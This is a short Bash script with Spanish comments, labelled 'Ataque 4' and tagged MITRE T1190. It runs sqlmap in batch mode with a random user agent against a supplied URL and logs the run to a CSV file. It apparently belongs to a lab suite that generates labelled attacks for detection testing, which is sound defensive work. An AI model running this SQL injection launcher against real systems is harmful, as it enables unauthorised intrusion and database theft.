#!/usr/bin/env bash
# Ataque 4: Inyeccion SQL (MITRE T1190)
# Uso: ./attack4_sqli.sh <URL_CON_PARAMETRO> (ej: http://192.168.10.10/app.php?id=1)
set -euo pipefail
source "$(dirname "$0")/_lib_log_ataque.sh"
URL="${1:?Uso: $0 <URL_CON_PARAMETRO_VULNERABLE>}"
TARGET=$(echo "$URL" | sed -E 's#https?://([^/]+).*#\1#')

INICIO=$(log_inicio)
echo "[+] Ejecutando pruebas de inyeccion SQL contra ${URL}..."
sqlmap -u "${URL}" --batch --level=2 --risk=1 --random-agent \
  --output-dir="/tmp/sqlmap_$(date +%s)" || true
log_fin "sql_injection" "T1190" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque registrado en log_ataques.csv"
